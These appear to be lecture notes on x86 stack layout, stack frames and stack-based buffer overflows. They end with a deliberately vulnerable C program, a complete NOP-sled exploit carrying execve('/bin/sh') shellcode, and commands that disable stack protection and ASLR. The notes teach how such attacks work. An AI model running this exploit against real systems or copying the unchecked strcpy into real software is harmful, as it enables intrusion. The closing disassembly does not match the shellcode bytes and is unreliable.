# Lecture notes on Security Engineering – Part 4: The stack

*August 2022*

## <a name="1" class="anchor"></a> [Stack layout](#1)

The stack grows towards lower memory addresses. The stack pointer `%esp` points to top of stack, which is the lowest valid address and last pushed to stack.

The initial layout of stack operation using `push` and `pop`.

|        |   |              |
| -------| - | :------------|
|        | a | `0xbfff8000` |
|        | b | `0xbfff7ffc` |
|        | c | `0xbfff7ff8` |
|        | d | `0xbfff7ff4` |
| `%esp` | e | `0xbfff7ff0` |
|        |   | `0xbfff7fec` |
|        |   | `0xbfff7fe8` |

Layout after `push f` to increment pointer, create space, and store `f` at address.

|        |   |              |
| ------ | - | :------------|
|        | a | `0xbfff8000` |
|        | b | `0xbfff7ffc` |
|        | c | `0xbfff7ff8` |
|        | d | `0xbfff7ff4` |
|        | e | `0xbfff7ff0` |
| `%esp` | f | `0xbfff7fec` |
|        |   | `0xbfff7fe8` |

Layout after `pop %eax` to decrement pointer and store value in `%eax` (note that `f` is still at `0xbfff7fec` but will be overwritten on next `push`).

|        |   |              |
| ------ | - | :----------- |
|        | a | `0xbfff8000` |
|        | b | `0xbfff7ffc` |
|        | c | `0xbfff7ff8` |
|        | d | `0xbfff7ff4` |
| `%esp` | e | `0xbfff7ff0` |
|        | f | `0xbfff7fec` |
|        |   | `0xbfff7fe8` |

|        |   |
| ------ | - |
| `%eax` | f |

## <a name="2" class="anchor"></a> [Stack frames](#2)

A stack is composed of frames that are pushed to the stack on function calls. The address to the current frame is stored in frame pointer `%ebp`.

A frame contains function parameters, which are pushed to stack by caller, return address to jump to at the end, pointer to previous frame (save `%ebp` to stack and set `%ebp = %esp`, frame pointer is lowest valid address and part of prologue), and local variables, which are part of the prologue executed by caller (address location is subtracted to move towards lower addresses, typically 4 bytes).

The epilogue is executed by the callee to deallocate local variables, `%esp = %ebp`, save result in some register, such as `%eax`, restore frame pointer of caller function, and then resume execution from saved return address.

### <a name="2.1" class="anchor"></a> [Function calls and stack layout](#2.1)

```c
int convert(char *str) {
    int result = atoi(str);
    return result;
}
int main(int argc, char **argv) {
    int sum, i;
    for (i=0; i < argc; i++) {
        sum += convert(argv[i]);
    }
    printf("sum=%d\n", sum);
    return 0;
}
```

Frame pushed by main caller.

|        |              |
| ------ | :----------- |
| `argv` | `0xbfff8000` |
| `argc` | `0xbfff7ffc` |
| return address (from main) | `0xbfff7ff8` |

Frame pushed by `main`.

|     |      |
| --- | :--- |
| frame pointer (before main) | `0xbfff7ff4` |
| `sum` | `0xbfff7ff0` |
| `i` | `0xbfff7fec` |
| `str` | `0xbfff7fe8` |
| return address (from convert to main) | `0xbfff7fe4` |

Frame pushed by `convert`.

|     |      |
| --- | :--- |
| frame pointer (before convert) | `0xbfff7fe0` |
| `result` | `0xbfff7fdc` |
| paramater to `atoi` | `0xbfff7fd8` |

### <a name="2.2" class="anchor"></a> [Function calls in assembly](#2.2)

Below is a function call and its assembly code. The assembly code is generated with [Compiler Explorer](https://godbolt.org/) using `x86-64 gcc 4.1.2` and flag `-m32` for 32-bit, AT&T syntax).

```c
#include <stdio.h>

void func(int n) {
    printf("argument: %d;\n", n);
}
int main(int argc, char **argv) {
    func(10);
    return 0;
}
```

Generated assembly instructions for `func`, `leave` is same as `mov %ebp, %esp` followed by `pop %ebp`, operand size suffix is omitted for clarity.
    
```x86asm
.LCO
    .string "argument: %d;\n"

func:
    ; void func(int n) {
    push    %ebp
    mov     %esp, %ebp
    sub     $8, %esp
    ; printf("argument: %d;\n", n);
    mov     8(%ebp), %eax
    mov     %eax, 4(%esp)
    mov     $.LCO, (%esp)
    call    printf
    ; }
    leave
    ret
```

Generated assembly instructions for `main`.

```x86asm
main:
    ; int main(int argc, char **argv) {
    lea     4(%esp), %ecx
    and     $-16, %esp
    push    -4(%ecx)
    push    %ebp
    mov     %esp, %ebp
    push    %ecx
    sub     $4, %esp
    ; func(10);
    mov     $10, (%esp)
    call    func
    ; return 0;
    mov     $0, %eax
    ; }
    add     $4, %esp
    pop     %ecx
    leave
    lea     -4(%ecx), %esp
    ret
```

## <a name="3" class="anchor"></a> [Stack-based overflow](#3)

A stack overflow, or stack smashing, is a special case of buffer overflow on the stack or heap, where data can overflow allocated buffer and overwrite other memory locations, such as return address.

### <a name="3.1" class="anchor"></a> [NOP slide](#3.1)

A [NOP slide](https://en.wikipedia.org/wiki/NOP_slide), or `nop`-sled, is a sequence of do-nothing instructions used to fill stack and eventually reach a jump to some injected shellcode.

Shellcode is any code used to start a shell, such as `execve("/bin/sh")`.

### <a name="3.2" class="anchor"></a> [Stack-based buffer overflow attacks](#3.2)

Below is a program vulnerable to a buffer overflow attack using `nop`-sled and injected shellcode.

```c
/* program.c */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    /* buffer of size 512 bytes */
    char buffer[512];
    /* set all bytes in buffer to zero, no leftovers */
    memset(buffer, 0, sizeof(buffer));
    /* copy first argument to buffer without boundary check */
    if (argc > 1) {
        strcpy(buffer, argv[1]);
    }
    /* print content in buffer */
    printf("buffer@%p: %s\n", buffer, buffer);
    return 0;
}
```

Below is an exploit, where shellcode is a hexadecimal string encoding machine instructions. The shellcode can also be written in assembly and inserted into executable by compiler, `gcc -o exploit exploit.c shellcode.s` with `unsigned char code[] = ... ;` replaced by `extern char shellcode[];`.

```c
/* exploit.c */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define PROGRAM "./program"

/* shellcode */
unsigned char shellcode[] =
    "\xeb\x15\x5b\x31\xc0\x89\x5b\x08\x88\x43\x07\x8d\x4b\x08\x89\x43"
    "\x0c\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/bin/sh";
/* inline macro to get stack pointer */
__inline__ unsigned int get_esp(void) {
    unsigned int res;
    __asm__("movl %%esp, %0" : "=a" (res));
    return res;
}

int main(int argc, char **argv) {
    unsigned int address, i, offset = 0;
    char buffer[768];
    char *n[] = { PROGRAM, buffer, NULL };
    /* offset from base address */
    if (argv[1]) {
        offset = strtol(argv[1], NULL, 10);
    }
    /* address to jump to, stack pointer + offset */
    address = get_esp() + offset;
    fprintf(stderr, "using address %#010x\n", address);
    /* set all bytes in buffer to zero, no leftovers */
    memset(buffer, 0, sizeof(buffer));
    /* fill buffer with addresses, four byte at a time */
    for (i = 0; i < sizeof(buffer); i += 4) {
        *(unsigned int *)(buffer + i) = address;
    }
    /* nop-sled to fill half buffer with nop, 0x90 is hex for na */
    memset(buffer, 0x90, sizeof(buffer)/2);
    /* place shellcode after nop-sled, rest is filled with addresses */
    memcpy(buffer + sizeof(buffer)/2, shellcode, strlen(shellcode));
    /* execute program with buffer as argument */
    execve(n[0], n, NULL);
    perror("execve");
    exit(1);
}
```

Run exploit with `-fno-stack-protector` to disable the stack protection (sometimes enabled by default) and `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` to disable address space layout randomization (ASLR).

```bash
$ CFLAGS="-m32 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2"
$ cc $CFLAGS -o program program.c
$ cc $CFLAGS -o exploit exploit.c
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0
$ ./exploit 1500
using address 0x0xbffffa34
buffer@0xbffff970: ...
bash$
```

For the curious, disassemble shellcode.

```bash
$ python -c 'print("\xeb\x15\x5b\x31\xc0\x89\x5b\x08\x88\x43\x07\x8d\x4b\x08\x89\x43" + "\x0c\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/bin/sh")' | ndisasm -u - 
```

```bash
00000000  C3                ret
00000001  AB                stosd
00000002  155B31C380        adc eax,0x80c3315b
00000007  C2895B            ret 0x5b89
0000000A  08C2              or dl,al
0000000C  884307            mov [ebx+0x7],al
0000000F  C28D4B            ret 0x4b8d
00000012  08C2              or dl,al
00000014  89430C            mov [ebx+0xc],eax
00000017  C289C3            ret 0xc389
0000001A  82                db 0x82
0000001B  C2B00B            ret 0xbb0
0000001E  C3                ret
0000001F  8D                db 0x8d
00000020  C280C3            ret 0xc380
00000023  A8C3              test al,0xc3
00000025  A6                cmpsb
00000026  C3                ret
00000027  BFC3BFC3BF        mov edi,0xbfc3bfc3
0000002C  2F                das
0000002D  62696E            bound ebp,[ecx+0x6e]
00000030  2F                das
00000031  7368              jnc 0x9b
00000033  0A                db 0x0a
```
